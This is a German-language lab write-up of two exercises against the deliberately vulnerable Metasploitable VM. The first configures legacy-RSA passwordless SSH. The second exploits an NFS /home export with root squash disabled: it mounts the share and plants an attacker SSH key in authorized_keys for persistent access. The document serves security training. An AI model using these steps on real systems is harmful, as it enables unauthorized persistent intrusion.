# Übung 1: SSH auf Metasploitable

## Ziel der Übung

In dieser Übung wurde ein passwortloses SSH-Login auf dem Zielsystem Metasploitable konfiguriert. Hierfür wurde ein Public/Private-Key-Verfahren verwendet, um eine Authentifizierung ohne Passwort zu ermöglichen. Diese Konfiguration dient als Vorbereitung für die folgende Übung, in der die Datei `~/.ssh/authorized_keys` gezielt manipuliert wird.

Der SSH-Server von Metasploitable unterstützt ausschließlich ältere RSA-Schlüssel. Moderne Standardformate wie ed25519 werden nicht akzeptiert. Zusätzlich blockiert der aktuelle SSH-Client unter Kali Linux ältere RSA-Algorithmen standardmäßig, weshalb bestimmte Optionen manuell aktiviert werden mussten.

---

## Erstellung eines RSA-Schlüsselpaares

Auf dem Kali-System wurde zunächst ein RSA-Schlüsselpaar erzeugt:

```sh
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa_meta
```

```sh

└─$ ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa_meta

```

Das Schlüsselpaar wurde ohne Passphrase erstellt, um eine vollständig passwortlose Anmeldung zu ermöglichen.

## Übertragung des öffentlichen Schlüssels

Anschließend wurde der öffentliche Schlüssel auf das Zielsystem übertragen. Aufgrund der veralteten SSH-Version mussten zusätzliche Optionen gesetzt werden, um die Verbindung zu erzwingen:

```sh
ssh-copy-id -i ~/.ssh/id_rsa_meta.pub \
  -o PubkeyAcceptedKeyTypes=+ssh-rsa \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o KexAlgorithms=+diffie-hellman-group1-sha1 \
  -o Ciphers=+aes128-cbc \
  msfadmin@192.168.6.51
```


Die Passwortabfrage erfolgte einmalig, da der Schlüssel zu diesem Zeitpunkt noch nicht hinterlegt war.

# Übung 2: portmapper/nfs

## Ziel der Übung

Ziel dieser Übung war es, die Datei `~/.ssh/authorized_keys` auf dem Zielsystem Metasploitable ohne direkten SSH-Zugriff zu manipulieren. Dies wurde durch eine Fehlkonfiguration des NFS-Dienstes ermöglicht.

Metasploitable exportiert Verzeichnisse über NFS mit deaktivierter Root-Squash-Option. Dadurch ist es möglich, als Root-Benutzer auf dem Angreifersystem Dateien mit Root-Rechten auf dem Zielsystem zu erstellen oder zu verändern.

Diese Fehlkonfiguration erlaubt es, einen eigenen SSH-Public-Key direkt in die Datei `authorized_keys` einzufügen und dadurch einen passwortlosen Zugriff zu erzwingen.

---

## Überprüfung der NFS-Freigaben

Zunächst wurde auf dem Kali-System überprüft, welche Verzeichnisse vom Zielsystem exportiert werden:

```sh
showmount -e 192.168.6.51
```

Beispielausgabe:

```sh
Export list for 192.168.6.51:
/home *
```

Das Verzeichnis `/home` wird für alle Clients freigegeben.

---

## Einbinden des NFS-Shares

Anschließend wurde das exportierte Verzeichnis lokal eingebunden:

```sh
sudo mkdir /mnt/meta
sudo mount -t nfs 192.168.6.51:/home /mnt/meta
```

Nach erfolgreichem Mount-Vorgang konnte auf das Home-Verzeichnis des Benutzers `msfadmin` zugegriffen werden:

```sh
ls /mnt/meta/msfadmin
```

---

## Manipulation der authorized_keys

Nun wurde der zuvor erzeugte öffentliche Schlüssel in die Datei `authorized_keys` des Benutzers eingefügt.

Falls das Verzeichnis `.ssh` noch nicht existierte, wurde es erstellt:

```sh
sudo mkdir -p /mnt/meta/msfadmin/.ssh
```

Anschließend wurde der Public Key hinzugefügt:

```sh
sudo sh -c "cat ~/.ssh/id_rsa_meta.pub >> /mnt/meta/msfadmin/.ssh/authorized_keys"
```

Die Dateiberechtigungen wurden angepasst:

```sh
sudo chmod 700 /mnt/meta/msfadmin/.ssh
sudo chmod 600 /mnt/meta/msfadmin/.ssh/authorized_keys
```

Da Root-Squash deaktiviert ist, wurden die Dateien mit Root-Rechten auf dem Zielsystem erstellt.

---

## Test des SSH-Zugriffs

Nach erfolgreicher Manipulation wurde die Verbindung getestet:

```sh
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -o HostKeyAlgorithms=+ssh-rsa \
    -i ~/.ssh/id_rsa_meta \
    msfadmin@192.168.6.51
```

Beispielausgabe:

```sh
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

Last login: Tue Jan 20 10:15:32 2026 from 192.168.6.10
msfadmin@metasploitable:~$
```

Die Anmeldung erfolgte erfolgreich ohne Passwortabfrage. 

---

## Zusammenfassung

Durch die Fehlkonfiguration des NFS-Dienstes war es möglich, das Home-Verzeichnis des Benutzers `msfadmin` remote einzubinden und die Datei `authorized_keys` direkt zu manipulieren.  

Dies stellt ein erhebliches Sicherheitsrisiko dar, da ein Angreifer ohne gültige Zugangsdaten einen dauerhaften SSH-Zugang einrichten kann.  

Die Ursache der Schwachstelle liegt in der unsicheren NFS-Konfiguration mit deaktivierter Root-Squash-Funktion.
